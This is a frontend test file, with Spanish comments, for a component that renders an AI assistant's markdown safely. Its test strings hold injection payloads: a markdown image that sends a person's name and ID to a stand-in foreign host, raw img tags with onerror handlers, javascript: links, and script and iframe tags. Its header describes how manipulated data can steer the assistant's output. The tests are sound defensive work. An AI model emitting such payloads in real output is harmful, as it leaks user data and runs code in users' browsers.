import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import MarkdownText from './MarkdownText';

/**
 * Seguridad del texto del asistente: lo que el modelo escribe puede venir manipulado por un dato (un nombre, una nota, el contenido de
 * un paquete). Nada de eso debe hacer que el navegador cargue algo ajeno ni ejecutar código.
 */
describe('MarkdownText: el texto del asistente no puede sacar datos ni ejecutar nada', () => {
  it('NO dibuja imágenes (así el navegador no pide direcciones ajenas con datos dentro)', () => {
    const { container } = render(<MarkdownText>{'Listo. ![x](https://sitio-ajeno.example/pixel.png?datos=TRK-1795-Rosa-Quispe-71234501)'}</MarkdownText>);
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('sitio-ajeno.example');
    expect(screen.getByText(/imagen omitida: x/)).toBeInTheDocument();
  });

  it('tampoco con formas alternativas de imagen (referencia, HTML crudo, data:)', () => {
    const body = ['![a][ref]', '', '[ref]: https://sitio-ajeno.example/a.png', '', '<img src="https://sitio-ajeno.example/b.png" onerror="alert(1)">', '', '![c](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)'].join('\n');
    const { container } = render(<MarkdownText>{body}</MarkdownText>);
    expect(container.querySelector('img')).toBeNull();
    // ningún elemento que cargue o enlace algo (el HTML crudo se muestra como TEXTO, que no hace ninguna petición)
    expect(container.querySelectorAll('[src], [href], [onerror], [onclick]').length).toBe(0);
  });

  it('los enlaces no son enlaces: solo texto (sin href que se pueda tocar)', () => {
    const { container } = render(<MarkdownText>{'[pulsa aquí](https://sitio-ajeno.example/robar) o [js](javascript:alert(1)) o https://sitio-ajeno.example/x'}</MarkdownText>);
    expect(container.querySelector('a')).toBeNull();
    expect(container.innerHTML).not.toContain('href');
    expect(container.innerHTML).not.toContain('javascript:');
  });

  it('el HTML crudo (scripts, iframes, manejadores de eventos) se muestra como texto, no se interpreta', () => {
    const { container } = render(<MarkdownText>{'<script>alert(1)</script> <iframe src="https://sitio-ajeno.example"></iframe> <b onclick="alert(1)">hola</b>'}</MarkdownText>);
    expect(container.querySelector('script, iframe, b[onclick]')).toBeNull();
    expect(container.innerHTML).not.toContain('<script');
    expect(container.innerHTML).not.toContain('<iframe');
  });

  it('lo legítimo se sigue viendo: negritas, listas y tablas', () => {
    const { container } = render(<MarkdownText>{'**Listo**\n\n- uno\n- dos\n\n| a | b |\n|---|---|\n| 1 | 2 |'}</MarkdownText>);
    expect(container.querySelector('strong')).not.toBeNull();
    expect(container.querySelectorAll('li').length).toBe(2);
    expect(container.querySelector('table')).not.toBeNull();
  });
});
